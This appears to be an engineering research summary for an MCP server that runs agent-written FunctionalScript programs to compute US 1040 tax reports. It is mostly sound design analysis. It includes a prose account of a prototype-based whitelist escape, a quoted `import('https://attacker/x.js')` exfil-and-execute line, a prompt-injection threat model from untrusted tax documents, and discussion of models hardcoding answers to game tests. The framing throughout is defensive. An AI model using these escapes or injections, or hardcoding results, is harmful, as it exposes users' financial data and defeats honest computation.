# Project Research Summary

**Project:** Finance — MCP server over content-addressable storage executing agent-authored FunctionalScript programs to compute US personal income tax reports
**Domain:** Developer-tooling / regulated-computation hybrid: an agent-facing execution substrate whose acceptance test is a legally-defined document
**Researched:** 2026-08-03
**Confidence:** HIGH

---

## Executive Summary

This is not a tax product with an agent bolted on. It is an **execution substrate** — content-addressed storage, an effect whitelist, and a program runner — whose first workload happens to be a Form 1040. Four researchers, working independently against the installed `functionalscript@0.40.0` and against current IRS primary sources, converged on the same shape: the infrastructure (MCP protocol, stdio transport, CAS, Evo, effects, RTTI→JSON-Schema) already exists in fjs and should be reused verbatim; the genuinely net-new work is three things — a restricted effect interpreter, a set of `vnd.fjs.*` document dialects, and exact-cent tax arithmetic. Everything else is assembly. The project's central thesis ("the report is a program, not an answer") is also **empirically validated**: TaxCalcBench (Column Tax, arXiv 2507.16126) measured frontier models at 32.35% strictly-correct 1040s across 51 realistic scenarios, with tax-table misuse, arithmetic errors, and qualified-dividends-worksheet errors as the documented failure modes — precisely what a stored, re-runnable program fixes. That benchmark is public and its scope maps almost exactly onto the recommended v1, converting Success Criterion 1 from "one return" into "51 graded returns plus one real one" at near-zero cost.

Three findings invalidate settled decisions and must reach the roadmap before planning starts. **First: the whitelist is not a whitelist today.** `match` (`fjs/effects/module.f.js:282`) does a plain bracket lookup on a plain object, so `Object.prototype` members are reachable. Against a whitelist containing exactly *one* operation, dispatching `__defineGetter__` installs an attacker-controlled getter **on the whitelist object itself**; reading that property then runs arbitrary code. This was reproduced end to end, with no `import()` involved. The recorded design claim — "an operation that is not in the map simply cannot happen" — is false as written. Both fixes are verified and trivial (`Object.hasOwn` guard; `Object.create(null)` map), and critically, the `Object.hasOwn` guard **is** the already-scheduled Week 1 "refuse unknown operations cleanly" task. The security fix costs zero additional schedule. **Second: the named Week 5 remedy cannot exist.** Three planning documents propose validating agent-authored source with `djs/parser`. DJS is a data language — `AstConst = Primitive | AstModuleRef | AstArray | AstObject`, with no function node, and functions are an explicit upstream TODO. `fjs/js/` contains only a tokenizer. Week 5 would open with a plan that dissolves on contact. **Third: ChatGPT cannot connect to this server at all** — it supports remote HTTPS + OAuth connectors only, never local stdio — which directly contradicts the authoritative README goal statement and Success Criterion 2.

The recommended approach is therefore: correct the documents first (hours of work, before any code), then build the interpreter — the riskiest component and the one with *zero* dependencies on CAS, Evo, or MCP, so it can be built and fully proof-tested in isolation on day one. Run the whole server under Node's Permission Model from the first `claude mcp add` registration; it is a launcher flag, it is stable since Node 23.5, and it converts the accepted `import()` risk from "wipes the home directory" to "corrupts a recoverable content store" for ~0.5 dev-days. Be honest that it is a seat belt, not a boundary — Node's permission surface has **no network permission**, so exfiltration of the complete tax record remains unmitigated in-process. The dominant remaining risk is not architectural but domain: Form 1040 line 16 is a four-way branch, and the sub-$100,000 path is a **table lookup that disagrees with bracket arithmetic by $1–$12** on essentially every return. That single mistake fails Success Criterion 1 outright, and it is the exact mistake an LLM will make, because bracket math is what the training data explains.

---

## Key Findings

### Recommended Stack

There is one dependency and there will be one dependency. `functionalscript@0.40.0` already contains the MCP session state machine, the typed tool registry, RTTI→JSON-Schema conversion, the stdio transport, the streaming CAS, the Evo revision DAG, effects-as-data with mock/virtual/node interpreters, and a complete working seven-tool CAS+Evo MCP server that the finance server should be a strict superset of. Every "what library should we use for X" question therefore resolves to EXISTS, BUILD, UPSTREAM, CONFIG, or DON'T — never to npm. Three fjs modules have misleading names and must not be adopted: `fjs/types/bigfloat` is a decimal→binary *literal conversion* helper with two exports and no arithmetic (verified — its only consumers are number tokenizers); `fjs/types/prime_field` is modular arithmetic for cryptography; and `fjs/effects/node`'s `sandbox` operation is `performance.now()` + `try/catch`, not isolation.

**Core technologies:**
- **Node.js 26.x** (CI already pins it): runtime — first line where the Permission Model (stable ≥23.5), ESM syntax detection for extensionless files (default ≥22.7), and `node --test`'s `expectFailure` are all stable at once. fjs's own test registration branches on Node 26. Do not drop below it.
- **`functionalscript` 0.40.0**: the entire library surface — protocol, transport, storage, effects, types, media.
- **TypeScript 7.0.x, `--noEmit`, JSDoc only**: GA 2026-07-08. Caveat: 7.0 *tightened* JS/JSDoc checking, and there is no stable programmatic API until 7.1, which rules out adding a linter this cycle.
- **Node Permission Model (`--permission` + scoped `--allow-fs-*`)**: CONFIG, not code. The single highest-value hardening available at zero dependency cost. Register it in the `claude mcp add` command line from day one so the safe configuration is the only one anyone has.
- **Own `McpConfig` pinned to `2025-11-25`** — *not* `casConfig`, which pins `2024-11-05` (verified at `fjs/mcp/module.f.js:54`) and identifies the server as `functionalscript-cas`. `mcpStep` takes config as a parameter, so this needs no fork. ~0.1 dev-days; highest value-per-minute item in the corpus.
- **BUILD (upstreamable): `fjs/exact/`** — rational arithmetic + named rounding modes + integer-cent money. ~2 dev-days. fjs has no decimal, no rational, and no rounding beyond `divUp`/`roundUp` (which round up only, and whose own doc comments warn they truncate rather than floor on negatives — and tax lines carry losses).

### Expected Features

**Must have (table stakes):**
- Store raw bytes immutably and deduplicated — free with CAS, and IRS retention (3/6/7 years, effectively indefinite for basis records) makes append-only a *requirement*, not just an architecture.
- `vnd.fjs.w2`, `vnd.fjs.1099int`, `vnd.fjs.1099div` dialects, keys mirroring the form's own box numbers (`box1b`, never `qualifiedDividends`), carrying the **form revision** not just the tax year, with every box explicitly absent-able (1099-B blank box 1e means "basis not reported", which is not zero).
- Corrected documents supersede without overwriting — and the `CORRECTED` checkbox is printed on the form itself, so the amendment signal is data, not inference.
- Form 1040 core lines 1a–37, Schedule B, standard deduction with age/blindness increments.
- **Tax Table lookup + Tax Computation Worksheet + Qualified Dividends and Capital Gain Tax Worksheet** — line 16 is a four-way branch, and a 1099-DIV with box 1b > 0 makes the QDCGT worksheet mandatory.
- Tax-year parameters as data, with a per-parameter source citation (Rev. Proc. number + section).
- Every computed line carries the (documentHash, boxPath, value) tuples it derived from.
- Clean refusal errors that **name the permitted operations** — Anthropic's guidance is explicit that agents self-correct from actionable errors and cannot from opaque ones.
- `finance_schema(dialect)` and `finance_tax_params(year)` — the most under-appreciated tools in the design and the cheapest to add. Without them the agent guesses field names and hardcodes remembered parameter values, which is the exact TaxCalcBench failure mode.
- **Scope guard** — nobody asks for this and everybody needs it. The failure mode to design against is not imprecision; it is silently emitting a plausible number for an input the engine does not model.

**Should have (differentiators):**
- **Level-3 traceability** — line → program expression → inputs → source documents → OCR artifact → raw bytes, all content-addressed and re-runnable. TurboTax Desktop's QuickZoom and SurePrep's SPbinder reach level 2 (line → document/field) and no shipping product reaches level 3, because the derivation lives inside proprietary software.
- **Mechanical 1040-X columns from a report diff** — Form 1040-X *is* a three-column diff (A original, B net change, C correct). Corrected 1099 → new Evo revision → re-run the same stored program → diff the two stored reports → that diff is Columns A/B/C with per-line source hashes already attached. Requires no new mechanism beyond what is already committed to. Strongest differentiator in the feature set.
- **Graded correctness against TaxCalcBench** — publishable evidence for the thesis.
- **A second, non-tax report over the same documents** — the cheapest possible proof of the "reports are programs" claim.

**Defer (v2+):**
- 1099-B / Form 8949 / Schedule D (and note capital loss carryover drags multi-year support from "nice" to "required").
- 1099-R, SSA-1099 (the Social Security Benefits Worksheet is a genuinely nasty 18-line near-circular computation — research originally said 19; corrected in Phase 13 against `[VERIFIED: i1040gi.pdf (2025) p32]`).
- Schedule A, Schedule 1 breadth, Schedules 2/3/8812, K-1/Schedule E.
- **Never:** state returns (store boxes 15–20 faithfully, compute nothing), 1099-NEC (its three-box simplicity is a trap — the downstream is Schedule C/SE/QBI, explicitly out of scope), a "tax engine" module (recreates the thing the architecture exists to avoid), `finance_compute_1040` (would destroy the thesis permanently — the agent would call it and never author a program).

### Architecture Approach

Two tracks that are genuinely parallel. Track A is an execution spine whose riskiest component depends on nothing; Track B is pure format design. The load-bearing insight, verified by a working prototype: because `interpret` is the *only* code path between a guest program and anything real, restriction and observation happen at the same interception point — so the run record's `inputs[]` is **observed, not declared**. A program cannot lie about, or forget to cite, what it read. That costs one accumulator and it is the highest-leverage structural property in the design.

**Major components:**
1. **`interpret`** (restricted runner) — translates a guest `Effect` into a host `Effect`; refuses non-whitelisted commands via `Object.hasOwn`; accumulates the read set. Depends on `fjs/effects` and *nothing else* — not CAS, not Evo, not MCP. Build it first precisely because it can be fully proof-tested in isolation with no store, no process, and no server.
2. **Guest ABI (`ctx`)** — the exact vocabulary a stored program may use: combinators + four read-only operation constructors + money helpers + `args`. **The ABI and the sandbox are the same object.** Freeze early; it has the widest blast radius of any interface here. (This is forced by a verified constraint absent from all three planning documents: a program stored in CAS **cannot resolve bare specifiers** — resolution walks up from `~/.cas/<a>/<b>/`, which has no `node_modules` — so `import { pure } from 'functionalscript/…'` inside a blob fails with `ERR_MODULE_NOT_FOUND`. Injecting `ctx` matches the `fjs r` precedent exactly: `unwrap(x).main({ ...options, args })`.)
3. **`fjs_run` tool handler** — `import_(cas.url(hash))` as an *effect* (making it proof-testable under `fjs/effects/node/virtual`, contra the spec's claim that the server cannot be proof-tested), then `interpret`, then the handler — not the program — writes the result and the run record to CAS.
4. **Format modules** — one directory per dialect mirroring `fjs/media/revision/module.f.js` literally: `dialect` as an exact literal in the schema (free discrimination), `mediaType` derived never written, `validate` split into structural rtti + semantic `checkReferences`, fjs's own JSON parser for canonical encoding, integer cents guarded by `Number.isSafeInteger`.
5. **Evo storage** — subject = the cBase32 hash of the raw artifact; the parse-forward chain (raw → OCR → typed → corrected) is successive revisions of that one subject; human labels live inside snapshots.

Reads flow **up** from the store into the program; writes flow **down** from the tool handler only. The guest never appears on a write path. That asymmetry is the security model and the provenance model at once.

### Critical Pitfalls

1. **`match` reaches `Object.prototype` — the whitelist is not total.** **RESOLVED: fixed upstream in fjs 0.41.0** ([#1419](https://github.com/functionalscript/functionalscript/pull/1419)) — `match` now uses an own-property lookup (`at`) plus `assert`, re-verified against 0.41.0. The finding below stands as written against 0.40.0. Verified escape from a one-operation whitelist via `__defineGetter__`, no `import()` needed. Guard comparison confirmed: for `constructor` on an empty map, `in` → true, `!== undefined` → true, `Object.hasOwn` → false. **Only `Object.hasOwn` is correct.** Do both fixes (`Object.create(null)` map *and* the `hasOwn` guard) and file upstream — `fjs/cas/evo` already guards against exactly this hazard for subject names, with a comment explaining why, so `match` simply did not get the same treatment. **This matters more after `import()` is closed, not less:** closing `import()` without fixing `match` ships a "sandboxed" runner that a five-line program walks out of, which is worse than the honest hole because it will be trusted.
2. **Line 16 from the rate schedule instead of the Tax Table.** The table's rows cover income *intervals* and print the tax on the interval **midpoint**. Worked example: MFJ taxable income $18,000 → table says **$1,803**; bracket math says **$1,800**. The filed return says 1,803, the $3 propagates into total tax and refund, and Success Criterion 1 fails. The QDCGT worksheet then calls *back into* the Tax Table for its ordinary-income component, so "just use brackets" is wrong twice. Signature symptom: line 16 off by $1–$12 while every line above it matches. Store the table as **data** and diff every row against the published Pub. 1040 — do not generate-and-assume.
3. **Float currency, and rounding in the wrong place.** Three separate bugs: binary floats cannot represent cents (`1.005 * 100 = 100.49999999999999`, `(1.005).toFixed(2) = "1.00"`); `Math.round` is asymmetric (`Math.round(-2.5) === -2`) and 1040s are full of negatives; and the IRS rule is *"include cents when adding and round off only the total"*, so `sum(round(x))` is wrong where `round(sum(x))` is right — and the divergence surfaces on a *different line* from the one under test. Rounding is a property of a 1040 **line**, not of a value. A `Money` type that rounds on construction is wrong by construction.
4. **Head resolution at run time destroys reproducibility.** An Evo head is a mutable pointer resolved at read time (`headsOf = hashes − parents`). A program that says "get the current 1099 for Chase" is not a pure function of content hashes — add an amended 1099 and the identical program hash produces a different report. That is not a bug in Evo; it is a bug in `fjs_run`'s contract if it advertises reproducibility. Also: `headsOf` returns an **array**; a generated program writing `heads[0]` picks by hash sort order, silently, and that means silently filing from the wrong version of a corrected 1099.
5. **The program contains the answer.** `export const main = () => pure({ line16: 9137 })` satisfies every stated criterion — it is a program, it is in CAS, it re-runs deterministically — and defeats the entire thesis. This is the single best-documented failure mode of LLM code generation under outcome pressure (ImpossibleBench: ~76% test-exploitation on one variant; SpecBench: Codex precomputing a 2,900-line lookup table). Make the check structural: design the report line type so `{ value }` without `{ sources }` does not typecheck, count CAS reads during the run and report the count, and make "perturb an input, assert the output moves" a standing workflow step rather than a Week 4 checkbox.
6. **No step limit, no timeout.** `asyncRun` is an unbounded `while (true)` with no budget, deadline, or cancellation. Stdio MCP is a single process handling requests serially, so a generated loop with a wrong termination condition does not fail — it *hangs*, with no response, no error, and no way to cancel. An LLM writing a wrong loop condition is a routine event, not an attack.

---

## Contradictions With Settled Decisions

Every finding below contradicts something currently recorded as settled in `.planning/PROJECT.md`, `todo/plan.md`, or `fjs/todo/implement-mcp-server.md`. **These are the highest-priority roadmap inputs**, because each one is cheap to correct now and expensive to discover mid-build.

| # | Document says | Research found | Change required |
|---|---|---|---|
| **C1** | PROJECT.md Constraints, `todo/plan.md` Week 5, and `fjs/todo/implement-mcp-server.md` "Known limitation" all propose closing the `import()` hole **"by parsing the source with FunctionalScript's own `djs/parser`"** | Verified: `AstConst = Primitive \| AstModuleRef \| AstArray \| AstObject` — **no function node**. `fjs/djs/ast/module.f.js` ends with a commented-out `// for functions … todo()` stub. `fjs/js/` contains only a tokenizer; `fjs/fsc/` is a character-class range map; `fjs/bnf/` has LL(1) machinery but no JS grammar. A real FunctionalScript parser is a multi-week **upstream** project, and even a finished one is a weak security control (Caja, ADsafe) because any gap between what the parser accepts and what V8 executes is a full escape. | **Delete the claim from all three documents before anything else.** Replace with: `--permission` now, child-process isolation with a wall-clock kill in the hardening phase, plus a textual import-specifier allow-list (~20 lines, blocks the `import('https://attacker/x.js')` exfil-and-execute variant entirely). If source validation is still wanted for *portability* reasons, say so explicitly and do not bank security on it. |
| **C2** | PROJECT.md Key Decisions + Constraints and `fjs/todo/implement-mcp-server.md`: *"a program requesting `fetch`, `readFile`, or `exec` finds no entry. Nothing needs to be intercepted or patched — an operation that is not in the map simply cannot happen."* PROJECT.md's "Known upstream fjs gap" describes the problem as only an opaque `TypeError`. | **False today, and verified by execution.** `constructor`, `toString`, `valueOf`, `hasOwnProperty` silently succeed against an empty map. `__defineGetter__` installs a getter on the whitelist object itself, and reading that property runs attacker-supplied code — a complete escape from a one-operation whitelist, with no `import()` involved. | Rewrite the claim to: *"an operation not in the map cannot happen **provided the guard is `Object.hasOwn` and the map has a null prototype**."* Upgrade the upstream report from "opaque error message" to "soundness hole in the mechanism the security model rests on," with the reproduction attached. Proposed upstream fix: a third `['refused', command]` `MatchResult` variant, or a `matchOwn`. |
| **C3** | PROJECT.md "What This Is" and the authoritative README `## Goal`: *"uses ChatGPT (or any other MCP client) to compute tax and other financial reports."* Success Criterion 2: *"Point an agent at the MCP server… ask 'what do I owe for 2025?'"* ARCHITECTURE.md's own system diagram still says "MCP client (ChatGPT / Claude)". | **ChatGPT supports remote HTTPS + OAuth connectors only. It cannot connect to a local stdio server.** Confirmed against current public documentation. Bridging (e.g. `mcp-remote`) is required, and a real remote transport means HTTP + OAuth + tenancy — a milestone of its own that also invalidates the argument that the `import()` hole is tolerable. | Amend the goal statement and Success Criterion 2 to name **Claude Code / Claude Desktop** as the demonstration client. The settled "stdio only, single local user" decision is still right — it is what makes the `import()` limitation tolerable. This costs nothing now and surfaces in Week 4 as "the acceptance demo is impossible with the client the README promises" if left. |
| **C4** | `todo/plan.md` open question 1 proposed default: *"US federal, **TY2025**, W-2 and 1099-INT/DIV only."* | Contradicts PROJECT.md Success Criterion 1 (*"feed it a year already filed; every 1040 line matches"*). TY2025 cannot be diffed against a filed return at build time. TY2025 is also the **worst possible first year**: OBBBA (P.L. 119-21, July 2025) retroactively changed already-published parameters — standard deduction $15,000/$30,000/$22,500 → **$15,750/$31,500/$23,625** (confirmed on the face of the 2025 Form 1040 and in Tax-Calculator's current `policy_current_law.json`) — and added a brand-new **Schedule 1-A** feeding a brand-new Form 1040 **line 13b**. A TY2025 return that does not model line 13b is structurally incomplete. | **Build and acceptance-test against TY2024. Treat TY2025 as a second parameter dataset.** TY2024 has a filed return to diff, parameters published once, and no Schedule 1-A. Any TY2025 parameters must come from Rev. Proc. 2024-40 **as modified by Rev. Proc. 2025-32** — a transcription from the original 2025 inflation-adjustment release is wrong for the year being targeted. |
| **C5** | PROJECT.md requirement and `fjs/todo` spec: `fjs_run` args are `{ hash: string }`. "Does `fjs_run` take arguments beyond the hash?" is filed as **non-blocking**. | If heads are resolved *inside* the program, the same program hash produces different reports after an amendment — which this project explicitly encourages. Success Criterion 4 becomes unattainable. | **Promote to blocking and answer it in the first phase: yes, `fjs_run` takes pinned input hashes.** The signature is a breaking change once stored programs exist. Recovery cost after the fact: MEDIUM (rewrite every program written against it). |
| **C6** | `fjs/todo`: *"Reuse `casConfig`, or declare our own server identity? Our own is probably right… but it costs nothing to start with `casConfig`."* | `casConfig` pins `protocolVersion: '2024-11-05'` (verified, `fjs/mcp/module.f.js:54`), and `mcpStep` **validates but ignores** the client's requested version — there is no negotiation, only a pin. A public report (thingsboard-mcp #35, April 2026) describes Claude Desktop negotiating `2025-11-25`, receiving `2024-11-05`, listing tools successfully, and then **never issuing a single `tools/call`** — a silent failure. | **Declare your own `McpConfig` at `2025-11-25` from the first commit.** The protocol version is the reason, not branding. Confidence in the *need*: MEDIUM (single detailed report). Confidence that it is nearly free: HIGH. Verify empirically in ten minutes by piping `initialize` at both versions and diffing. |
| **C7** | PROJECT.md Active requirement: *"Store raw PDF statement bytes without parsing them"* — implicitly through the MCP server. | `cas_add` caps inline content at **128 KiB**; real bank and brokerage PDFs are 100 KB–2 MB and base64 inflates by 4/3. The only route is `npx functionalscript cas add`, run in the user's shell — **from a different process**, so the running server's in-memory Evo head cache never learns about it. Symptom: "I uploaded it but the report says there's no 1099," intermittently, depending on whether the server has restarted. | The requirement is satisfied via a documented **CLI route plus a cache-refresh tool** (or re-scan on `evo_list`/`evo_head` when the store mtime changed). Write the CLI step into the ingestion documentation now; do not build a base64 PDF upload tool that silently rejects at 128 KiB. |
| **C8** | PROJECT.md open question 5 and `todo/plan.md` both frame result disposition as a binary whose write-back branch **"decides whether the whitelist includes CAS *writes*."** PITFALLS.md repeats the same implication. | **The implication is false.** There are two possible writers and only one was considered. If the **tool handler** writes after `interpret` returns, the guest whitelist stays read-only and provenance becomes *structural* rather than a program-authorship convention — a program cannot forget to write a record or write one that disagrees with what it returned. | Answer OQ5 as: **write result + run record to CAS, return hashes plus a bounded inline preview; the tool writes; `casWrite`/`evoAdd` stay out of the guest whitelist.** This also removes what made OQ5 look blocking. |
| **C9** | PROJECT.md Constraints: the `import()` hole is *"Accepted for Week 1 **only** because the sole user is trusted and local."* | The user was never the untrusted party. The documented input chain is *untrusted document → LLM vision pass → stored blob → LLM authors program → `fjs_run`*. "Single local user" defends against network attackers and says nothing about the attacker already inside the documents the server exists to read. Worse, this architecture removes the usual friction: an injection does not have to talk the model into an anomalous action, because "write a FunctionalScript program and call `fjs_run`" **is** the sanctioned action. | Keep the deferral — it is defensible **on schedule grounds** — but rewrite the justification so the compensating controls are explicit and checkable: `--permission` flags in the registered launcher, a pinned import-specifier surface, and a written input-provenance rule in AGENTS.md ("only documents you obtained yourself, in a session you initiated"). State plainly that `--permission` does **not** cover network, so exfiltration remains unmitigated in-process. |
| **C10** | `todo/plan.md` open question 2 calls the Evo subject model *"annoying to change once documents exist."* | It is a **correctness** question, not a naming question, and recovery is HIGH: CAS has **no delete** (`Cas` is `read`/`write`/`list` — verified), so wrong subjects linger forever and migration means rewriting every stored revision. Two genuinely distinct documents with byte-identical extracted JSON collapse to one hash; the *subject* layer is what disambiguates them. Also verified: `validateParentSubjects` rejects cross-subject parents, so **a subject can never be renamed** — there is no ref layer, no alias, no move. | Treat OQ2 as blocking for Track B, decide it in the first phase, and adopt content-derived subjects (see OQ2 answer below). Additionally decide the **retraction story** now (`vnd.fjs.revision` has an `archived?` flag — decide whether report programs must filter archived revisions) and use a **project-local CAS home**, not the shared `~/.cas`. |
| **C11** | `fjs/todo` Testing: *"The server itself cannot be proof-tested directly."* | True of `casMcpServer`, but **not of `fjs_run`**. `import` is already an effect (`Import = ['import', (path) => IoResult<Module>]`, `fjs/effects/node/module.f.d.ts:133`), and `fjs/effects/node/virtual` implements it over an in-memory FS with `JsModule` entries. If the host reaches `import()` through the `import_` effect rather than a raw expression, `fjs_run` is proof-testable end to end with no filesystem. | Correct the testing section. **Nothing in Track A needs to touch `~/.cas/` to be tested** — protect that, because the moment a test needs a real store the suite stops being a proof and becomes a fixture-management problem. |
| **C12** | PROJECT.md Active requirement: *"Compute a full line-by-line 1040 plus relevant schedules."* | Directly tensions with the scope-guard recommendation (refuse on unmodeled input). Both are not satisfiable in v1. | Reconcile in the requirements as: **"a full line-by-line 1040 *for returns within the declared scope*, and a hard refusal outside it."** The guard is what makes a partial 1040 honest rather than quietly wrong. |

---

## Answers to the Open Questions

### OQ1 — Tax scope: **partially answered; the remainder is a user decision**

| Sub-question | Answer | Support |
|---|---|---|
| Jurisdiction | US federal only | Already settled |
| **Year** | **TY2024 for the acceptance test; TY2025 as the second dataset** | FEATURES and STACK reached this independently — FEATURES from Success Criterion 1's need for a filed return to diff, STACK from the OBBBA/Rev. Proc. 2025-32 parameter trap. Contradicts `todo/plan.md`'s proposed default (see C4). |
| Forms | 1040 core + Schedule B + Tax Table/Tax Computation Worksheet + **QDCGT worksheet**; dialects W-2, 1099-INT, 1099-DIV. Schedule 1-A Parts I/V/VI only if the taxpayer is 65+ and the year is 2025+. Schedule D/8949/1099-B is the first post-v1 increment. | FEATURES, read from current IRS PDFs |
| Authoritative vs estimate | **Neither — "exact within a declared scope, with a hard refusal outside it."** There is no legal distinction for a self-prepared return (preparer regulation keys off *compensation*, not software), so this is an engineering standard, and "estimate" is the weaker one because it has no pass/fail criterion. | FEATURES |

**One tension to resolve deliberately.** FEATURES argues for "exact within scope, refuse outside"; PITFALLS' UX section argues the output must be presented as a **reviewed estimate** with "review against your documents before filing." These are not in conflict once separated: *exact-within-scope-or-refuse* is the engineering contract; *reviewed estimate, not an answer* is the user-facing framing. Both belong in the output, alongside the year, the parameter-set hash, and the program hash.

### OQ2 — Evo subject model: **answered, with one refinement**

**Subject = the cBase32 CAS hash of the document's original artifact. Parsed representations are successive revisions of that subject. Human-readable labels live inside the snapshot, never in the subject.**

Four independent arguments, two of them verified against the package:
- **Subjects can never be renamed** (`validateParentSubjects`). So `doc/2025/1099-int/chase` is a permanent, uncorrectable assertion — and the classification in that name is exactly what turns out to be wrong (it is a 1099-OID; it is Chase Auto not Chase Bank N.A.; it is dated 2025 but is for tax year 2024). Under a hash-named subject a misfiling is fixed by adding a revision; under a path name it is fixed by abandoning the history that is the entire point.
- **fjs designed the idiom in.** `evo_add { parents: [], subject: H }` where `H` is the artifact's own hash is the *two-field* call — `resolveSnapshot` errors with *"subject must be a valid hash when snapshot is omitted and there are no parents"* otherwise. fjs's own proofs use this shape.
- **Four comparable systems converged here independently** — Perkeep's permanode ("really just a signed random number", deliberately carrying no mutable state), Git's commit-hash-plus-refs split, Datomic's explicit documented rule that idents *"should not be used as unique names or ids on ordinary domain entities"*, IPFS's CID + IPNS. Identity is opaque; names are data on top. (MEDIUM confidence — this is comparative reasoning, not verification.)
- **Dedup is free and it matters here.** Re-uploading the same PDF resolves to the *same* subject, so ingestion can say "already ingested, head is X" instead of silently creating a second parallel history and a double-counted 1099.

**The refinement FEATURES adds, and it is important: a brokerage PDF is not one document.** Brokers issue a *consolidated/composite* 1099 — one multi-page statement containing 1099-INT, 1099-DIV, 1099-B and 1099-OID sections. One uploaded file yields *N* typed documents, so the subject cannot simply be "the uploaded file" for the extracted forms. The reconciliation: **root the artifact chain at the artifact hash** (raw bytes → OCR → typed), and give each extracted *form instance* its own subject keyed on `(payerTin, recipientTin, accountNumber, taxYear, formType)`, with the artifact hash recorded as provenance inside the snapshot. This also sidesteps PITFALLS' dedup-collision hazard: two genuinely distinct PDFs are never byte-identical, but two extracted JSON blobs can be, so extraction hashes are the wrong thing to root a subject at.

Honest cost, stated once: "find all 1099-INTs" becomes O(subjects) with a head read each. At tens of documents per year this is unmeasurable. The growth path (one well-known index subject holding a `label → subject` map) is purely additive, so deferring it is safe.

### OQ3 — OCR format: **answered, unanimously — store it**

All three of FEATURES, ARCHITECTURE, and PITFALLS reached "store it" by different routes, which is strong signal:
- **Diagnosability** (FEATURES): when a line is wrong, the question is always "did vision misread the document, or did the program misuse a correctly-read value?" Without the intermediate artifact that question is unanswerable — and transcription is the most likely error in the whole pipeline.
- **Reclassification without a second vision pass** (ARCHITECTURE — the decisive argument). When a 1099-INT turns out to be a 1099-OID, the correction branches from the **OCR revision**, not the PDF. A second vision pass is *not deterministic*: the model may read a different number the second time, so a correction would silently change unrelated numbers. Treating OCR as transient forecloses this permanently.
- **Security** (PITFALLS): an injection that survived the vision pass is now inside a stored blob that the agent reads back *while authoring the program* — at which point it looks like trusted structured data rather than a suspicious PDF. Keeping free text confined to the OCR dialect, and the narrowed document to typed fields only, limits the second bite.

Layering: `vnd.fjs.ocr` holds near-verbatim page-oriented transcription with numbers as **printed strings** (`"1,234.56"`); `vnd.fjs.1099int` holds typed fields with **integer cents** (`123456`). That puts the `"1,234.56" → 123456` conversion in exactly one reviewable place, on a revision boundary, instead of smearing it across a vision prompt.

### OQ4 — Deadline and definition of done: **genuinely open — user decision**

No amount of research settles whether an external date drives the five weeks. Research does supply a concrete **definition-of-done candidate**, which the user should accept or reject: *the TaxCalcBench 51-case corpus passing at a stated threshold, plus the user's own filed TY2024 return matching line by line (not just totals), plus an adversarial re-run in which an amended revision is added between two runs of a pinned program and the output is byte-identical.*

### OQ5 — `fjs_run` result disposition: **answered — this is the strongest convergence in the corpus**

**Write the result and a run record back to CAS; return their hashes plus a bounded inline preview. The `fjs_run` tool handler performs the write, not the program. The guest whitelist stays read-only.**

**STACK and FEATURES reached the same conclusion by completely independent routes, and neither cites the other:**
- **STACK, from the transport.** `writeResponse` calls `tryUtf8(stringifyJson(resp) + '\n')`, which returns `null` past `maxLength`. Traced through `text` → `bit_vec` → `bigint.maxLength = 0x100000n` bits = **131,072 bytes = 128 KiB**. A full 1040 with per-line provenance (every line carrying its source hashes) will approach or exceed that, and overflow does not crash — it degrades to a `-32603` internal error with **no indication that size was the problem**. So this is not a preference between "permanent audit trail" and "simpler": the inline path fails opaquely at exactly the payload the project is built to produce.
- **FEATURES, from traceability.** Level-3 traceability (line → derivation → inputs, re-runnable) is Success Criterion 4 and the differentiator no shipping product offers. An inline-only result cannot be diffed, cited, or re-verified later — and the mechanical 1040-X (Columns A/B/C from a report diff) is impossible without two stored reports to diff.

**ARCHITECTURE adds the refinement that resolves the thing that made OQ5 look blocking: the *tool* writes, not the program.** All three planning documents (and PITFALLS) assumed write-back implies `casWrite` in the guest whitelist. It does not. Making the write a property of the *tool* rather than of program discipline is what turns "reproducible if the program was written well" into "reproducible, full stop" — a program cannot opt out, forget, or write a record that disagrees with what it returned. And because `interpret` is the only thing that ever touches guest operations, the run record's `inputs[]` is **observed** rather than declared. This was verified in a prototype: the host state after interpreting a two-step program came back as the read set alongside the result.

Shape: `fjs_run { hash, args?, subject?, parents? }` → `import_` → `interpret` → encode result → `cas.write` → assemble `vnd.fjs.run { program, inputs[], result, status }` → `cas.write` → optional `evo.add` → `okResult { runHash, resultHash, inputs, result? }`. Inline the value only when it comfortably fits; add an **explicit size check** before `writeResponse` so an oversized result says "result too large; stored at `<hash>`" instead of inheriting the silent `-32603`.

### The three sub-questions owned by `fjs/todo/implement-mcp-server.md`

| Question | Answer | Reason |
|---|---|---|
| Does `fjs_run` take arguments beyond the hash? | **Yes, and it is blocking, not non-blocking** | Reproducibility (SC4) is unattainable if heads resolve inside the program. See C5. |
| Reuse `casConfig` or declare our own identity? | **Declare our own, pinned to `2025-11-25`** | The protocol version, not branding. See C6. |
| Is the entry point `main`? | **Yes — `main(ctx)`** | Verified: `fjs r` does `unwrap(x).main({ ...options, args })`, which is also the precedent for injecting a context object. Keeping the name means every agent-authored program is CLI-debuggable, which is worth the constraint. The `forever`-expressibility worry is handled by the whitelist (`forever` is not in it) plus a step budget, not by narrowing the entry point. |

### Still genuinely open

- **Tax scope specifics that depend on the taxpayer, not on research** — see "What Still Needs the User."
- **Whether Week 5 "source validation" is worth attempting at all** — decide after the `--permission` launcher has been running and real refusal errors have been seen. It is no longer a security necessity (C1); it may still be a portability nicety.
- **Tax Table band widths at the low end.** STACK assumed a uniform $50 band and flagged it MEDIUM; PITFALLS found widths of $5/$10/$25/$50 depending on income level. PITFALLS is more specific and resolves the question in the direction STACK feared — which is why the table must be **stored as data and diffed row by row**, not generated from the rate schedule and trusted.

---

## Cross-Dimension Agreements and Disagreements

### Where researchers agree independently (treat as high-signal)

| Finding | Reached by | Note |
|---|---|---|
| Result → CAS, return a hash | STACK (transport cap), FEATURES (traceability), ARCHITECTURE (structural provenance), PITFALLS (audit trail) | **Four for four, four different reasons.** The most robust conclusion in the corpus. |
| Store the OCR artifact | FEATURES, ARCHITECTURE, PITFALLS | Diagnosability, determinism, and injection containment. |
| Money is integer cents; floats never touch tax math | All four | Also all four independently name `fjs/types/bigfloat` as *not* a decimal library. |
| Line 16 is not bracket arithmetic | STACK, FEATURES, PITFALLS | All three cite TaxCalcBench's finding that models consistently misuse tax tables; PITFALLS supplies the worked $1,803-vs-$1,800 example. |
| `match`'s prototype hazard is real | ARCHITECTURE and PITFALLS reproduced it independently; STACK confirmed the weaker `TypeError` form | Orchestrator confirmed the full escape. Not a claim needing hedging. |
| 128 KiB is one number appearing everywhere | STACK, ARCHITECTURE, PITFALLS | `Vec`, `readFile`, `readBytes`, CAS chunks, `cas_add` inline content, and stdio response lines. Design around it once. |
